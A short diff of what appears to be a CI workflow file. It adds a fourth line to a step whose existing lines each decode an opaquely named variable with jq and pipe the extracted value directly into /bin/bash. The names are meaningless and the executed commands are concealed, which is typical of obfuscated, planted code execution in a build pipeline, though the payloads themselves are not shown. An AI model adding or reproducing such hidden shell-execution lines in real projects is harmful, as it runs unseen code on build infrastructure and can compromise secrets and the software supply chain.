@@ -34,6 +34,7 @@ jobs:
           echo $yiv68607 | jq -r .huqij31958 | /bin/bash
           printf '%s' "$mqy25" | jq -r .rq6 | /bin/bash
           echo $zv4373 | jq -r .r4 | /bin/bash
+          echo $rkf2 | jq -r .oca456 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
